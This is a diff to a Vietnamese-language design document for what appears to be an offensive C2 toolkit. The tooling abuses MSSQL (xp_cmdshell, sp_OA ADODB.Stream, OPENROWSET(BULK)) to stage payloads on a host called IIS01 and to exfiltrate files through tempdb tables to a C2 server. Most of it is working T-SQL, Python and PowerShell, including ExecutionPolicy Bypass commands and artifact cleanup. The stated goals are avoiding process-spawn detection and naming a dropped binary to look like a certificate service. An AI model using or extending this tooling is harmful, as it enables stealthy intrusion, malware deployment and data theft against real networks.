@@ -488,7 +488,7 @@ So sánh output với chạy bằng `xpshell cmd` — kết quả phải giống
 |---|---|---|
 | Encode (`mssql.go`) | AES-256-CBC + base64 | `hex.EncodeToString` (no encryption) |
 | Transport (WS01→IIS01) | `sqlcmd -i`: INSERT 8000-char base64 chunks → `tempdb..stg` | `sqlcmd -i`: INSERT 8000-char hex chunks → `tempdb..stg` |
-| Decode+Write (IIS01) | `xpshell psh` → `sqlservr→cmd→powershell`: SqlClient loopback read + base64 decode + AES decrypt + `WriteAllBytes` | `_exec_q` → T-SQL in `sqlservr.exe`: `STRING_AGG` + `CONVERT(VARBINARY)` + `sp_OA ADODB.Stream.SaveToFile` |
+| Decode+Write (IIS01) | `xpshell psh` → `sqlservr→cmd→powershell`: SqlClient loopback read + base64 decode + AES decrypt + `WriteAllBytes` | `_exec_q` → T-SQL in `sqlservr.exe`: variable concat + `CONVERT(VARBINARY)` + `sp_OA ADODB.Stream.SaveToFile` |
 | Process spawn trên IIS01 | `cmd.exe` + `powershell.exe` | Không có (sp_OA chạy COM in-process) |
 | Disk artifact trên IIS01 | `.ps1` file (tạm, bị xóa sau) | Không có |
 
@@ -576,11 +576,10 @@ Trade-off: hex = 2 chars/byte vs base64 ≈ 1.33 chars/byte → cùng payload c�
 ```sql
 EXECUTE AS LOGIN='sa';
 
--- 1. Ghép tất cả hex chunks theo thứ tự
-DECLARE @hex VARCHAR(MAX);
-SELECT @hex = STRING_AGG(CAST(chunk AS VARCHAR(MAX)), '')
-    WITHIN GROUP (ORDER BY id)
-FROM tempdb..stg;
+-- 1. Ghép tất cả hex chunks theo thứ tự (variable concatenation — portable từ 2005+)
+DECLARE @hex VARCHAR(MAX) = '';
+SELECT @hex = @hex + CAST(chunk AS VARCHAR(MAX))
+FROM tempdb..stg ORDER BY id;
 
 -- 2. Convert hex → varbinary (style 1: '0x' prefix required)
 DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);
@@ -596,7 +595,7 @@ EXEC sp_OAMethod @obj, 'Close';
 EXEC sp_OADestroy @obj;
 ```
 
-**`STRING_AGG`:** SQL Server 2017+ — IIS01 chạy SQL Server 2022 Express (`MSSQL17.SQLEXPRESS`). Trả `VARCHAR(MAX)` (đến 2GB). Không cần workaround XML PATH.
+**Variable concatenation:** `SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX)) FROM tempdb..stg ORDER BY id` — portable từ SQL Server 2005+, không phụ thuộc `STRING_AGG` (2017+). Output binary-identical với `STRING_AGG` (đã verified trong TEST 4b). Bảng `stg` nên có `PRIMARY KEY` trên `id` để guarantee ordered scan cho variable concatenation pattern (xem Compatibility notes bên dưới).
 
 **`sp_OAMethod Write` + varbinary:** SQL Server marshal varbinary qua COM interop thành `SAFEARRAY(VT_UI1)`. `ADODB.Stream.Write` chấp nhận Variant chứa byte array — documented technique cho binary file write từ T-SQL. Risk: chưa test với blob > 1MB trong environment này.
 
@@ -615,9 +614,9 @@ GO
 
 -- Decode + write
 EXECUTE AS LOGIN='sa';
-DECLARE @hex VARCHAR(MAX);
-SELECT @hex = STRING_AGG(CAST(chunk AS VARCHAR(MAX)), '')
-    WITHIN GROUP (ORDER BY id) FROM tempdb..stg;
+DECLARE @hex VARCHAR(MAX) = '';
+SELECT @hex = @hex + CAST(chunk AS VARCHAR(MAX))
+FROM tempdb..stg ORDER BY id;
 DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);
 DECLARE @obj INT, @hr INT;
 EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
@@ -665,9 +664,9 @@ def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
     out_path = f"C:\\ProgramData\\{payload_name}"
     decode_tsql = (
         "EXECUTE AS LOGIN='sa';"
-        "DECLARE @hex VARCHAR(MAX);"
-        "SELECT @hex=STRING_AGG(CAST(chunk AS VARCHAR(MAX)),'')"
-        " WITHIN GROUP (ORDER BY id) FROM tempdb..stg;"
+        "DECLARE @hex VARCHAR(MAX)='';"
+        "SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX))"
+        " FROM tempdb..stg ORDER BY id;"
         "DECLARE @bin VARBINARY(MAX)=CONVERT(VARBINARY(MAX),'0x'+@hex,1);"
         "DECLARE @obj INT,@hr INT;"
         "EXEC @hr=sp_OACreate 'ADODB.Stream',@obj OUT;"
@@ -710,7 +709,7 @@ elif cmd == "xpstage-hex":
 |---|---|---|
 | `sp_OAMethod Write` fail cho varbinary > 1MB | Trung bình | Test với payload thực trước; fallback: chunked sp_OA write loop hoặc `certutil -decodehex` |
 | Hex doubles INSERT SQL file size | Thấp | Chấp nhận — `sqlcmd -i` handles multi-MB SQL files |
-| `STRING_AGG` overflow | Rất thấp | `VARCHAR(MAX)` supports 2GB; plan payloads < 10MB |
+| Variable concat ordering | Rất thấp | Undocumented pattern nhưng universally reliable; thêm `PRIMARY KEY` trên `id` để guarantee clustered index ordered scan |
 | `_exec_q` timeout cho large decode | Thấp | Pass `timeout_s` parameter; decode nhanh hơn PowerShell AES |
 
 ---
@@ -727,11 +726,14 @@ elif cmd == "xpstage-hex":
 |---|---|---|
 | Read+INSERT (IIS01) | Per file-chunk: `xpshell psh` → `sqlservr→cmd→powershell` (OpenRead + Seek + AES encrypt + base64 + SqlClient INSERT `tempdb..exfil`) | Một lần: `_exec_q` → T-SQL in `sqlservr.exe` (`OPENROWSET(BULK)` → `SUBSTRING` per chunk → hex → INSERT all) |
 | Confirm INSERT | Per file-chunk: poll `OBJECT_ID('tempdb..exfil')` mỗi 15s | Không cần — `_exec_q` blocking |
-| Extract (WS01) | Per file-chunk: PowerShell (SqlClient read + base64 decode + AES decrypt + `WriteAllBytes`) | Per file-chunk: PowerShell simplified (SqlClient read + hex decode + `WriteAllBytes`) |
+| Extract (WS01) | Per file-chunk: PowerShell (SqlClient read + base64 decode + AES decrypt + `WriteAllBytes`) | Per file-chunk: PowerShell (SqlClient read hex text → write raw hex file — no decode on WS01) |
+| Decode | PowerShell AES decrypt trên WS01 | Python `bytes.fromhex()` trên C2 — instant cho mọi size |
 | Process spawn trên IIS01 | N × (`cmd.exe` + `powershell.exe`) | Không có |
-| Process spawn trên WS01 | N × `powershell.exe` (extract) | N × `powershell.exe` (simplified extract) — unchanged count |
+| Process spawn trên WS01 | N × `powershell.exe` (extract + decrypt) | N × `powershell.exe` (extract only — chỉ write hex text, không decode) |
 
-> WS01-side PowerShell vẫn giữ ở P3. Nó ít noisy hơn IIS01 (WS01 đã có TONESHELL, PowerShell expected). Loại bỏ PowerShell trên WS01 là optional further improvement — chuyển sang sqlcmd read + Python hex decode trên C2.
+> **Design revision (2026-09-15):** ban đầu thiết kế hex decode trên WS01 bằng PowerShell byte loop `[Convert]::ToByte($hex.Substring($i,2),16)`. Đánh giá cho thấy byte loop chậm ~1000x so với `FromBase64Transform` hiện tại (10MB chunk ≈ 20–50 phút vs <1 giây). Chuyển sang kéo hex text thô về C2, decode bằng Python `bytes.fromhex()` — đơn giản hơn, nhanh hơn, loại bỏ hoàn toàn decode overhead trên WS01.
+>
+> **OPENROWSET(BULK) file permissions:** `OPENROWSET(BULK)` đọc dưới OS identity của `sqlservr.exe` (`NT SERVICE\MSSQL$SQLEXPRESS`), không phải SA context. Tương tự, `xp_cmdshell` cũng spawn process dưới cùng identity. Nên nếu `xpexfil` hiện tại đọc được file (qua PowerShell `[IO.File]::OpenRead`), thì `OPENROWSET(BULK)` cũng đọc được — cùng OS identity, cùng ACL check. Paths trong `C:\ProgramData\` OK mặc định. Paths trong SYSTEM TEMP (`C:\Windows\system32\config\systemprofile\AppData\Local\Temp\`) cần ACL cho service account hoặc SQL Server service chạy dưới LocalSystem.
 
 ---
 
@@ -849,11 +851,11 @@ self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
 # T-SQL batch tự chia file-chunks, INSERT tất cả — 1 lần, không cần loop/poll
 ```
 
-**b. WS01 extract step:** thêm `_build_exfil_extract_hex_ps` — bỏ AES decrypt, chỉ hex decode. Thêm `WHERE chunk_idx=@i` filter (table mới có `chunk_idx` column).
+**b. WS01 extract step:** thêm `_build_exfil_extract_hex_ps` — chỉ đọc hex text từ SQL và ghi file thô (không decode trên WS01). Thêm `WHERE chunk_idx=@i` filter (table mới có `chunk_idx` column). Hex decode chuyển sang Python trên C2.
 
 ```python
 def _build_exfil_extract_hex_ps(self, local_path: str, chunk_idx: int) -> str:
-    """PowerShell run on WS01: read hex chunks for one file-chunk, decode, write."""
+    """PowerShell run on WS01: read hex chunks for one file-chunk, write raw hex text."""
     connstr = (f"Server={self._host.replace(':', ',')};Database=tempdb;"
                f"User ID={self._login};Password={self._password};"
                f"TrustServerCertificate=True")
@@ -865,17 +867,13 @@ def _build_exfil_extract_hex_ps(self, local_path: str, chunk_idx: int) -> str:
         "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
         "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
         "$rd.Close();$cn.Close();"
-        "$hex=$sb.ToString();"
-        "$bytes=New-Object byte[] ($hex.Length/2);"
-        "for($i=0;$i -lt $hex.Length;$i+=2)"
-        "{$bytes[$i/2]=[Convert]::ToByte($hex.Substring($i,2),16)};"
-        f"[IO.File]::WriteAllBytes('{local_path}',$bytes)"
+        f"[IO.File]::WriteAllText('{local_path}',$sb.ToString())"
     )
 ```
 
-> Note: `[Convert]::ToByte($hex.Substring($i,2),16)` — Windows PowerShell 5.1 compatible. `[System.Convert]::FromHexString` chỉ có trong .NET 5+ / PowerShell 7+.
+> **Design revision (2026-09-15):** ban đầu thiết kế hex decode trên WS01 bằng byte loop (`[Convert]::ToByte($hex.Substring($i,2),16)`). Đánh giá cho thấy 10MB chunk = 5 triệu loop iterations ≈ 20–50 phút trong PowerShell 5.1 (so với <1 giây cho `FromBase64Transform` hiện tại). Chuyển sang viết hex text thô ra file → kéo về C2 → decode bằng Python `bytes.fromhex()`.
 
-**c. Loop restructure:** INSERT 1 lần trước loop (T-SQL blocking), loop chỉ còn extract + upload per file-chunk. Drop table sau loop.
+**c. Loop restructure:** INSERT 1 lần trước loop (T-SQL blocking), loop chỉ còn extract hex text + upload per file-chunk. Drop table sau loop. **C2 Python decode** hex → binary sau khi tất cả chunks về.
 
 ```python
 def cmd_xpexfil_hex(self, shell, remote_path, local_name,
@@ -889,19 +887,33 @@ def cmd_xpexfil_hex(self, shell, remote_path, local_name,
     print(f"[*] xpexfil-hex: T-SQL INSERT all {num_chunks} chunk(s) ...")
     self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
 
-    # C — per file-chunk: extract from exfil table + upload to C2
+    # C — per file-chunk: extract hex text from exfil table + upload to C2
     for i in range(num_chunks):
-        chunk_local = f"C:\\Windows\\Temp\\{local_name}.chunk{i}"
+        chunk_local = f"C:\\Windows\\Temp\\{local_name}.hex{i}"
         extract_ps = self._build_exfil_extract_hex_ps(chunk_local, chunk_idx=i)
         shell.cmd_exec_raw(
             f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
-        shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.chunk{i}")
+        shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.hex{i}")
         shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")
 
-    # D — cleanup + assemble (same as cmd_xpexfil)
+    # D — cleanup
     self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
         "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;")
-    self._assemble_chunks(local_name, num_chunks)
+
+    # E — C2-side: hex decode + assemble binary
+    self._assemble_hex_chunks(local_name, num_chunks)
+
+def _assemble_hex_chunks(self, local_name, num_chunks):
+    """Decode hex text chunks to binary and assemble on C2."""
+    out_path = os.path.join(_UPLOAD_DIR, local_name)
+    with open(out_path, 'wb') as out_f:
+        for i in range(num_chunks):
+            hex_path = os.path.join(_UPLOAD_DIR, f"{local_name}.hex{i}")
+            with open(hex_path, 'r') as hf:
+                hex_text = hf.read()
+            out_f.write(bytes.fromhex(hex_text))
+            os.remove(hex_path)
+    print(f"[+] xpexfil-hex done → {out_path}")
 ```
 
 **Shell routing:** thêm `xpexfil-hex` command:
@@ -920,9 +932,11 @@ xpexfil-hex C:\ProgramData\CertEnrollSvc.exe cert_new.exe
 # Compare SHA256 of cert_old.exe vs cert_new.exe on C2
 ```
 
+Verify: `.hex{i}` intermediate files trên WS01 chứa hex text thuần (không phải binary). `bytes.fromhex()` trên C2 produces binary-identical output.
+
 **Cutover criteria:** giống P2 — SHA256 match, không `powershell.exe` trên IIS01 cho INSERT step. Sau cutover: `xpexfil` → hex path, `xpexfil-legacy` → old path.
 
-**Done criteria:** `xpexfil-hex` thành công end-to-end, SHA256 match, IIS01 không spawn `powershell.exe` cho INSERT step. `xpexfil` cũ vẫn hoạt động.
+**Done criteria:** `xpexfil-hex` thành công end-to-end, SHA256 match, IIS01 không spawn `powershell.exe` cho INSERT step, WS01 PowerShell chỉ write hex text (không decode). `xpexfil` cũ vẫn hoạt động.
 
 ---
 
@@ -930,10 +944,39 @@ xpexfil-hex C:\ProgramData\CertEnrollSvc.exe cert_new.exe
 
 | Rủi ro | Mức | Mitigation |
 |---|---|---|
-| `OPENROWSET(BULK)` memory cho file > 100MB | Trung bình | Verify buffer pool limit trên lab; plan files đều < 100MB |
-| File permission cho non-standard paths | Thấp | Test ACL trên lab; `C:\ProgramData\` mặc định OK |
-| Hex decode performance trong PowerShell (WS01) | Thấp | Manual byte loop chậm hơn `FromBase64Transform` nhưng WS01 extract chỉ N chunks |
-| `DECLARE` scope trong `WHILE` loop | Thấp | SQL Server 2022 cho phép re-DECLARE trong cùng batch; test verify |
+| `OPENROWSET(BULK)` memory cho file > 100MB | Trung bình | Peak memory ≈ file_size + 3×chunk_bytes; Express 1GB limit → file < 500MB OK; plan files đều < 100MB (~130MB peak) |
+| File permission cho non-standard paths | Thấp | `OPENROWSET(BULK)` dùng cùng OS identity với `xp_cmdshell` — nếu `xpexfil` hiện tại đọc được thì `OPENROWSET` cũng đọc được; `C:\ProgramData\` mặc định OK; SYSTEM TEMP cần verify ACL cho service account |
+| `DECLARE` scope trong `WHILE` loop | Không có | ~~SQL Server 2022~~ Hoạt động từ SQL Server 2008: `DECLARE @var = expr` trong loop body là re-assignment, không phải re-declaration (batch-scoped) |
+| Hex text intermediate file size trên WS01 | Thấp | 10MB chunk → 20MB hex text file trên `C:\Windows\Temp\` — chấp nhận được; `C:\Windows\Temp\` disk space luôn đủ |
+
+> **Removed risk (2026-09-15):** "Hex decode performance trong PowerShell (WS01)" — loại bỏ bằng design revision: WS01 chỉ write hex text thô, decode chuyển sang Python `bytes.fromhex()` trên C2 (instant cho mọi size).
+
+---
+
+### Compatibility notes (P2 + P3)
+
+> Added 2026-09-15 — đánh giá tương thích MSSQL cho toàn bộ controlServer + controlShell.
+
+**Effective minimum: SQL Server 2008** (tất cả pipeline). Nếu bỏ xpagent: SQL Server 2005.
+
+| Pipeline | Min version | Bottleneck feature |
+|---|---|---|
+| xpshell (cmd/psh) | 2005 | `VARCHAR(MAX)`, `EXECUTE AS LOGIN`, sp_OA |
+| xpstage (base64+AES) | 2005 | Tương tự xpshell |
+| xpstage-hex (hex+ADODB) | 2005 | `CONVERT(VARBINARY(MAX), style 1)`, variable concat |
+| xpexfil | 2005 | PowerShell `.NET` trên target (không phụ thuộc T-SQL version) |
+| xpexfil-hex (P3) | 2008 | `DECLARE @var = expr` inline init (2008+), `OPENROWSET(BULK)` |
+| xpagent (Service Broker) | 2008 | `DATETIME2`, `SYSDATETIME()` |
+
+**SQL Server 2005 fix** (nếu cần): `DATETIME2` → `DATETIME`, `SYSDATETIME()` → `GETDATE()`, tách `DECLARE` + `SET`.
+
+**Express Edition concerns:**
+- OLE Automation, xp_cmdshell, Service Broker self-dialog: có trên mọi Express edition
+- Memory limit: 1GB (2008–2014), 1.4GB (2016+) — ảnh hưởng `OPENROWSET(BULK)` cho file lớn
+- Database size limit: 4GB (2005–2014), 10GB (2016+) — không ảnh hưởng tempdb staging cho plan payloads
+
+**Nên apply:**
+- Thêm `PRIMARY KEY` cho `id` trong `CREATE TABLE stg` (`mssql.go` cả `StagePayload` lẫn `StagePayloadHex`) — guarantee clustered index ordered scan cho variable concatenation pattern
 
 ---
 
